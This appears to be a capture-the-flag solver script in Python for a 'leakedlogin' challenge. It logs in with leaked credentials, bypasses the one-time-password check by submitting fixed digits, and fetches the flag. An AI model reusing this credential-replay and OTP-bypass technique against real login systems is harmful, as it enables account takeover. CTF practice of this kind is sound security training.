#!/usr/bin/env python3
import requests


def main():
    baseurl = "https://leakedlogin.ctf.ritsec.club"
    username = "zach@bingus.biz"
    password = "b1nguS2000"

    s = requests.Session()

    print("Logging in...")
    data = {"email": username, "password": password}
    s.post(f"{baseurl}/verify", data=data)

    print("Verifying OTP...")
    data = {
        "otp_1": "1",
        "otp_2": "1",
        "otp_3": "1",
        "otp_4": "1",
        "otp_5": "1",
        "otp_6": "1",
        "submit": "Verifying...",
    }
    s.post(f"{baseurl}/verify/process.php", data=data)

    print("Getting flag...")
    data = {"goodness": "1"}
    r = s.post(f"{baseurl}/verify/flag.php", data=data)

    print(r.text)


if __name__ == "__main__":
    main()
